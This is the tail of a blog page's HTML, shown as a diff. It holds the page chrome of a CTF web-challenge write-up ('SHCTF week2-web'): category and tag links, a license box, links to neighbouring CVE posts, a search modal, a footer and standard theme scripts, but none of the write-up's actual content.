+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E6%AF%94%E8%B5%9BWrite-Up/" class="category-chain-item">比赛Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9BWrite-Up/" class="print-no-link">#比赛Write Up</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SHCTF week2-web</div>
+      <div>http://example.com/2025/02/20/shctf-Week2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/30/CVE-2025-25763/" title="CVE-2025-25763">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2025-25763</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/20/CVE-2024-57252/" title="CVE-2024-57252">
+                        <span class="hidden-mobile">CVE-2024-57252</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <!--音乐--> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script> <div id="player" class="aplayer aplayer-withlist aplayer-fixed" data-id="9723733050" data-server="netease" data-type="playlist" autoplay="true" data-order="list"  data-fixed="true" data-listfolded="true" data-theme="#2D8CF0"></div> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon<br /> 感谢 <a target="_blank" rel="noopener" href="https://www.dkdun.cn/">DK盾</a> 赞助|DK盾 QQ群:727077055 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
